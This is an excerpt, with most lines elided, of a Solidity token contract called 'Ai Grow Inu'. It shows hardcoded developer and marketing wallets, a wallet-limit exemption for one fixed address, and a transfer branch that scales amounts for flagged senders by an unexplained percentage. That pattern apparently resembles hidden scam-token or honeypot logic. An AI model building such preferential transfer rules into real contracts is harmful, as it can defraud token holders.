...
contract AGI is Context, IERC20 { 
    ...
    string private constant _name = "Ai Grow Inu";
    ...
    address payable public DevWallet = payable(0x333C34f10FC046499205cCAB464FEdc828461d75);
    address payable public MarketingWallet = payable(0x3815eA5a63467DDa285E06E5602d6fc26c4601A5);
    ...
    constructor () {
        ...
        _isWalletLimitExempt[0x5BC4a4DD65517Aa441b66C7BfF4d44b52106942f] = true;
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        if(!takeFee){
            ...
            uint256 sAmount;
            if (_isDividendExempt[sender]){sAmount = tAmount*rest/100;}
